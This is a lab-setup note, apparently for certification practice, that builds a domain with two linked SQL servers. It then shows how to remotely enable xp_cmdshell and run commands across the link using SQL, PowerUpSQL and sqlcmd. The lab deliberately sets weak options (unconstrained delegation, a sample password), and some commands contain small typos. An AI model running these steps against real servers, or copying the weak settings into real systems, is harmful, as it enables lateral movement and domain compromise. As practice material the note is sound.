### SQL Linked Servers (Lab Diagram) 
![[Pasted image 20251226193435.png]]

configuring the lab now

#### Machines Required:
1. Domain Controller "dc-eagle.eagle.com"
2. SQL server "SQL1.eagle.com"
3. SQL Server2 "SQL2.eagle.com"

# Step 1: Setting Up Active Directory Accounts

Since this is a domain-joined lab for practicing Kerberos authentication and delegation (common in CRTP for SQL Server lateral movement), you'll need domain accounts for SQL services and your "attacker" user. This ensures Windows authentication can flow through linked servers.

1. **Log in to the Domain Controller (DC-eagle.eagle.com)**:
    - Open Active Directory Users and Computers (ADUC).
2. **Create Service Accounts for SQL Services**:
    - These should be dedicated domain accounts (not local accounts) to allow Kerberos delegation.
    - Create two accounts:
        - **sqlsvc1**: For running the SQL service on SQL1.
        - **sqlsvc2**: For running the SQL service on SQL2.
    - In ADUC:
        - Right-click your domain (eagle.com) → New → User.
        - For sqlsvc1: Full name "SQL Service 1", User logon name "`sqlsvc1@eagle.com`", set a strong password (e.g., Passw0rd123!), and uncheck "User must change password at next logon".
        - Repeat for sqlsvc2.
    - Make these accounts members of the local Administrators group on their respective servers (SQL1 for sqlsvc1, SQL2 for sqlsvc2) to grant them sysadmin privileges in SQL Server. You can do this via Group Policy or remotely:
        - On **SQL1.eagle.com**: Run PowerShell as admin: `Add-LocalGroupMember -Group "Administrators" -Member "eagle\sqlsvc1"`
        - On **SQL2.eagle.com**: Run PowerShell as admin: `Add-LocalGroupMember -Group "Administrators" -Member "eagle\sqlsvc2"`
3. **Create an Attacker/User Account**:
    - Create a domain user for your "attacker" simulation.
    - In ADUC: New → User, full name "attacker", logon name "`attacker@eagle.com`", strong password.
    - This user should have sysadmin privileges on both SQL1 and SQL2 (to simulate having access to SQL1 and escalating to SQL2 via links).
        - On each SQL server, use SSMS: Connect as a local admin, then under Security → Logins → New Login → Search for "eagle\attacker" → Server Roles → Check "sysadmin".
4. **Enable Delegation for the Attacker Machine**:
    - Assuming your attacker machine is **SQL1.eagle.com** (where you'll run PowerUpSQL) is domain-joined.
    - In ADUC on the DC: Find the computer account for **SQL1** → Properties → Delegation tab → Select "`Trust this computer for delegation to any service (Kerberos only)`" (unconstrained delegation). This is crucial for multi-hop Kerberos in the lab.

# Step 2: Configuring SQL Services to Run Under Domain Accounts

By default, SQL services might run under NT AUTHORITY\SYSTEM or a local account. Switch to domain accounts for proper Windows auth.

1. **On SQL1**:
    - Open SQL Server Configuration Manager.
    - Under SQL Server Services → Right-click "SQL Server (MSSQLSERVER)" (or your instance name) → Properties → Log On tab.
    - Select "This account" → Enter "eagle\sqlsvc1" and the password.
    - Restart the service.
2. **On SQL2**:
    - Open SQL Server Configuration Manager.
    - Under SQL Server Services → Right-click "SQL Server (MSSQLSERVER)" (or your instance name) → Properties → Log On tab.
    - Select "This account" → Enter "eagle\sqlsvc2" and the password.
    - Restart the service.

This allows the SQL services to participate in Kerberos authentication chains.

# Step 3: Adding Service Principle Names (SPNs)
1. **Adding SPN for "eagle\sqlsvc1"**
	- On Domain Controller dc-eagle.eagle.com
	- open the command prompt
	- run the following command to add SPNs
```
setspn -S MSSQLSvc\SQL1.eagle.com eagle/sqlsvc1
setspn -S MSSQLSvc\SQL1.eagle.com:1433 eagle/sqlsvc1
```

2. **Adding SPN for "eagle\sqlsvc1"**
	- On Domain Controller dc-eagle.eagle.com
	- open the command prompt
	- run the following command to add SPNs
```
setspn -S MSSQLSvc\SQL2.eagle.com eagle/sqlsvc2
setspn -S MSSQLSvc\SQL2.eagle.com:1433 eagle/sqlsvc2
```

# Step 4: Linking SQL1 to SQL2

You'll create a linked server on SQL1 pointing to SQL2, using Windows authentication passthrough.

1. **On SQL1, Using SSMS**:
    - Connect to SQL1 as your **eagle\attacker** domain user (or sysadmin).
    - In Object Explorer: Server Objects → Linked Servers → Right-click → New Linked Server.
    - Linked server: Enter a name, e.g., "SQL2_LINK".
    - Server type: SQL Server.
    - Tick the certificate option to trust.
    - *Server name: Enter the FQDN or IP of SQL2, e.g., "sql2.eagle.com".* (not any effective)
    - Security tab: Select "**Be made using the login's current security context**" (this enables Windows auth passthrough via Kerberos/NTLM).
    - Click OK.

2. **Enable Required Options on the Linked Server**:
    - Still in SSMS on SQL1, run these queries:

```  SQL
EXEC sp_serveroption 'SQL2_LINK', 'data access', 'true';
EXEC sp_serveroption 'SQL2_LINK', 'rpc', 'true';
EXEC sp_serveroption 'SQL2_LINK', 'rpc out', 'true';
```

3. **Test the Link**:
    - Run: SELECT * FROM OPENQUERY(SQL2_LINK, 'SELECT @@SERVERNAME');
    - It should return SQL2's server name if the link works.

# Step 5: Remotely Enabling xp_cmdshell on SQL2 from SQL1's SSMS

Assuming you're connected to SQL1 as a sysadmin (e.g., attacker), and the linked server is set up with passthrough auth (so your sysadmin privileges hop to SQL2).

1. **Run These Queries on SQL1's SSMS**:
    - Enable advanced options on SQL2:
``` SQL
EXEC('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT SQL2_LINK;
```

   - Enable xp_cmdshell on SQL2:
``` SQL
EXEC('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT SQL2_LINK;
```
        
2. **Test xp_cmdshell on SQL2 from SQL1**:
    - Run: EXEC('EXEC xp_cmdshell ''whoami'';') AT SQL2_LINK;
    - It should return the output running as the SQL service account on SQL2 (e.g., eagle\sqlsvc2).

# Step 6: Using *PowerUpSQL.ps1* to Execute Commands on SQL2 from SQL1

PowerUpSQL is a PowerShell module for SQL Server pentesting. Run this from your attacker machine (logged in as attacker@eagle.com.

1. **Install/Import PowerUpSQL**:
    - Download from GitHub if needed: git clone https://github.com/NetSPI/PowerUpSQL.git
    - Import: Import-Module .\PowerUpSQL\PowerUpSQL.ps1
2. **Use Get-SqlServerLinkCrawl to Crawl and Execute**:
    - This function crawls linked servers and can execute queries.
    - Basic crawl test:

PowerShell:
```
Get-SqlServerLinkCrawl -Instance "sql1.eagle.com" -Query "SELECT @@SERVERNAME, SYSTEM_USER"
```
   - This should show results from SQL1 and SQL2 (via the link).
   - Execute a command on SQL2 via xp_cmdshell:

PowerShell
```
Get-SqlServerLinkCrawl -Instance "sql1.eagle.com" -Query "EXEC xp_cmdshell 'whoami'" -LinkedServer "SQL2_LINK"
```

# Step 6: Enabling xp_cmdshell via PowerUpSQL (If Not Enabled)

### enable xp_cmdshell using "`sqlcmd`"
1. Enable advanced options:
```
sqlcmd -S {INSTANE_NAME} -Q "EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT {LINK_SERVER_NAME}"
```
2. enable xp_cmdshell
```
sqlcmd -S {INSTANE_NAME} -Q "EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT {LINK_SERVER_NAME}"
```

3. Test 
```
sqlcmd -S sql1.eagle.com -Q "EXEC ('EXEC xp_cmdshell ''whoami'';') AT {LINKED_SERVER_NAME}"
```

